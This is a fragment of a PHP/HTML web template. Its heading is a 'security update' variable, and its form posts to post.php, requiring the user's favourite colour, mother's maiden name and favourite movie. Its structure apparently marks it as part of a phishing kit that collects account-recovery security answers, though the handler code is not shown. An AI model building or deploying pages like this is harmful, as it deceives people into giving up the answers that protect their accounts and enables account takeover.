...
<title><?php echo $updatesec;?></title>
<!-- Meta tag Keywords -->
		  ...
		  <form action="post.php" method="post">
			<div class="pom-agile">
				  <div style="background-color:#F2F2F2; border-top-right-radius: 2em; border-top-left-radius: 2em;" align="center"> 
				    <h1>&nbsp;</h1>
				    <h1><?php echo $updatesec;?></h1>
				    <p>&nbsp;</p>
				  </div>
			</div>
			<div class="pom-agile">
  <div style="background-color:#F2F2F2" align="center">
<input name="s1" type="text" placeholder="<?php echo $favc;?>" id="7" class="user" required />
</div>
</div>
<div class="pom-agile">
  <div style="background-color:#F2F2F2" align="center">
<input name="mmn1" type="text" placeholder="<?php echo $mother;?>" id="mmn1" class="user" required />
</div>
</div>
<div class="pom-agile">
  <div style="background-color:#F2F2F2" align="center">
<input name="movie1" type="text" placeholder="<?php echo $movie;?>" id="7" class="user" required />
</div>
</div>
